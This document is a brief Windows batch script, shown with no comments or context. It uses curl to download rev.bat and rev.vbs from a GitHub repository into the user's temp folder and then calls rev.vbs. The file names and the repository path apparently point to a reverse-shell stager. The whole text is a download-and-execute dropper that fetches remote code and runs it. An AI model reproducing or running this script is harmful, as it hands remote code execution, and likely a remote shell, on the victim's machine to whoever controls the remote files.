@echo off
set "temp_dir=%temp%"
curl https://raw.githubusercontent.com/0x2034/shell/main/rev.bat -o "%temp_dir%\rev.bat"
curl https://raw.githubusercontent.com/0x2034/shell/main/rev.vbs -o "%temp_dir%\rev.vbs"
call rev.vbs
exit
